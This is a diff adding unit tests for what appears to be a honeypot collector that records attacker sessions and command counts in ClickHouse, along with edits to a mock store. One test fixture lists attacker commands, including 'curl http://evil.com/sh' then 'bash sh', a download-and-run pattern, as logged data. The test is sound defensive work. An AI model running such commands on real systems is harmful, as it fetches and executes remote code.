@@ -723,6 +723,128 @@ class TestCollectorRecovery(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(final_sess["credentials_tried"], 1)
         self.assertEqual(final_sess["end_time"], "2026-09-06 06:36:48")
 
+    def test_active_session_reconciles_commands_without_session_end(self):
+        """Active session receives command events while still connected (no session_end).
+        ClickHouse sessions.commands_executed must immediately update to reflect actual commands.
+        """
+        store = MockClickHouseStore()
+        self.collector.clickhouse_client = store
+
+        sid = "active-session-reconcile"
+        start_event = {
+            "id": "msg-start-active",
+            "stream": StreamNames.SESSION_EVENTS,
+            "data": {
+                "event_type": "session_start",
+                "payload": {
+                    "session_id": sid,
+                    "timestamp": "2026-09-13 10:00:00",
+                    "attacker_ip": "1.2.3.4",
+                },
+            },
+        }
+        cmd_events = [
+            {
+                "id": f"msg-cmd-{i}",
+                "stream": StreamNames.COMMAND_EVENTS,
+                "data": {
+                    "event_type": "command",
+                    "payload": {
+                        "session_id": sid,
+                        "command": cmd_text,
+                        "timestamp": "2026-09-13 10:00:05",
+                    },
+                },
+            }
+            for i, cmd_text in enumerate(["whoami", "id", "uname -a", "pwd", "ls -la"])
+        ]
+
+        # 1. session_start (initially commands_executed = 0)
+        self.collector._write_events_to_clickhouse_sync([start_event])
+        sess_init = store.sessions.get(sid)
+        self.assertIsNotNone(sess_init)
+        self.assertEqual(sess_init["commands_executed"], 0)
+
+        # 2. commands arrive while session is still active (no session_end)
+        self.collector._write_events_to_clickhouse_sync(cmd_events)
+
+        # Must be reconciled to 5, NOT 0!
+        sess_after = store.sessions.get(sid)
+        self.assertIsNotNone(sess_after)
+        self.assertEqual(sess_after["commands_executed"], 5)
+
+    def test_late_commands_after_session_end_persists_updated_command_count(self):
+        """Commands arrive after session_end event has already been processed.
+        ClickHouse sessions.commands_executed must be reconciled to the new count.
+        """
+        store = MockClickHouseStore()
+        self.collector.clickhouse_client = store
+
+        sid = "late-cmd-session"
+        start_event = {
+            "id": "msg-start-late",
+            "stream": StreamNames.SESSION_EVENTS,
+            "data": {
+                "event_type": "session_start",
+                "payload": {
+                    "session_id": sid,
+                    "timestamp": "2026-09-13 10:00:00",
+                    "attacker_ip": "1.2.3.4",
+                },
+            },
+        }
+        end_event = {
+            "id": "msg-end-late",
+            "stream": StreamNames.SESSION_EVENTS,
+            "data": {
+                "event_type": "session_end",
+                "payload": {
+                    "session_id": sid,
+                    "timestamp": "2026-09-13 10:00:10",
+                    "duration_seconds": 10,
+                    "disconnection_reason": "Connection closed",
+                },
+            },
+        }
+        late_cmd_events = [
+            {
+                "id": f"msg-late-cmd-{i}",
+                "stream": StreamNames.COMMAND_EVENTS,
+                "data": {
+                    "event_type": "command",
+                    "payload": {
+                        "session_id": sid,
+                        "command": cmd_text,
+                        "timestamp": "2026-09-13 10:00:08",
+                    },
+                },
+            }
+            for i, cmd_text in enumerate(["curl http://evil.com/sh", "bash sh", "exit"])
+        ]
+
+        # 1. session_start
+        self.collector._write_events_to_clickhouse_sync([start_event])
+        # 2. session_end (processed before commands arrive, commands_executed = 0)
+        self.collector._write_events_to_clickhouse_sync([end_event])
+        sess_ended = store.sessions.get(sid)
+        self.assertEqual(sess_ended["commands_executed"], 0)
+
+        # 3. late commands arrive
+        self.collector._write_events_to_clickhouse_sync(late_cmd_events)
+
+        # Must be updated to 3
+        sess_final = store.sessions.get(sid)
+        self.assertEqual(sess_final["commands_executed"], 3)
+        self.assertEqual(sess_final["duration_seconds"], 10)
+
+        # Immutable identity fields MUST NOT be rewritten or changed
+        self.assertEqual(sess_final["session_id"], sid)
+        self.assertEqual(sess_final["attacker_ip"], "1.2.3.4")
+        for update_query in store.update_history:
+            self.assertNotIn("attacker_ip", update_query)
+            self.assertNotIn("start_time", update_query)
+            self.assertNotIn("protocol", update_query)
+
 
 class MockClickHouseStore:
     """Mock ClickHouse client with in-memory storage for table state & queries."""
@@ -824,11 +946,30 @@ class MockClickHouseStore:
         if "sessions" in sql_str:
             for sid, data in self.sessions.items():
                 if sid in sql_str:
-                    end_val = data.get("end_time")
-                    start_val = data.get("start_time")
-                    reason_val = data.get("disconnection_reason", "")
-                    if reason_val or str(end_val) != str(start_val):
-                        rows.append((end_val, data.get("duration_seconds", 0), reason_val))
+                    if "commands_executed" in sql_str:
+                        if "intent" in sql_str:
+                            rows.append((
+                                data.get("intent", ""),
+                                data.get("skill_level", 0),
+                                data.get("commands_executed", 0),
+                                data.get("credentials_tried", 0),
+                                data.get("duration_seconds", 0),
+                                data.get("disconnection_reason", ""),
+                            ))
+                        else:
+                            rows.append((
+                                data.get("commands_executed", 0),
+                                data.get("credentials_tried", 0),
+                                data.get("duration_seconds", 0),
+                                data.get("end_time"),
+                                data.get("disconnection_reason", ""),
+                            ))
+                    else:
+                        end_val = data.get("end_time")
+                        start_val = data.get("start_time")
+                        reason_val = data.get("disconnection_reason", "")
+                        if reason_val or str(end_val) != str(start_val) or (data.get("duration_seconds", 0) > 0):
+                            rows.append((end_val, data.get("duration_seconds", 0), reason_val))
         res.result_rows = rows
         return res
 
